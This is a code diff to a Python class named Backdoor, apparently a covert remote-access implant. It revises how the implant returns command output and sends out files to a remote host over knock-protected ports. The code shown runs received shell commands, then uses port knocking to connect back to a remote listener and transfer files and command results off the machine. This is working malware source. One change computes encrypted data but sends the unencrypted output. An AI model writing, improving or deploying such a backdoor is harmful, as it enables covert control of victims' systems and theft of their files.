@@ -7,11 +7,12 @@ import helpers
 
 class Backdoor(object):
 
-    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
+    def __init__(self, lhost, lport, lisport, fport, rhost, rport, proto, password, kList):
         self.state = 0
         self.localIP = lhost
         self.localPort = int(lport)
         self.listenPort = int(lisport)
+        self.filePort = int(fport)
         self.remoteIP = rhost
         self.remotePort = int(rport)
         self.protocol = proto.upper()
@@ -60,8 +61,8 @@ class Backdoor(object):
             filename = cmd[4:]
             if not os.path.exists(filename):
                 result = "File doesn't exist\n"
-
-            self.sendFile(filename)
+            else:
+                self.sendFile(filename)
         elif cmd[:5] == 'CLOSE':
             print("Backdoor closed...\n")
             sys.exit(0)
@@ -70,28 +71,29 @@ class Backdoor(object):
             result = result.stdout.read() + result.stderr.read()
 
         print("Result: %s" % result)
-        self.sendPacket(result)
+        self.sendResult(result)
         time.sleep(0.1)
 
-    def sendPacket(self, data):
-        payload = encryption.encrypt(self.password + data)
-        #chunks = [payload[start:start + chunk_size] for start in range(0, len(payload), chunk_size)]
-        if self.protocol == 'TCP':
-            packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
-        elif self.protocol == 'UDP':
-            packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
+    def sendResult(self, data):
+        encryptedData = encryption.encrypt(data)
 
-        send(packet, verbose=False)
-
-    def sendFile(self, filename):
         knocker = self.portKnocking(self.knockList)
-
         time.sleep(3)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = helpers.createSocket()
         sock.connect((self.remoteIP, self.listenPort))
 
+        sock.sendall(data)
+        sock.send(b'EOF')
+
+    def sendFile(self, filename):
         encryptedString = encryption.encryptFile(filename)
+
+        knocker = self.portKnocking(self.knockList)
+        time.sleep(3)
+
+        sock = helpers.createSocket()
+        sock.connect((self.remoteIP, self.filePort))
 
         sock.sendall(encryptedString)
         sock.send(b'EOF')
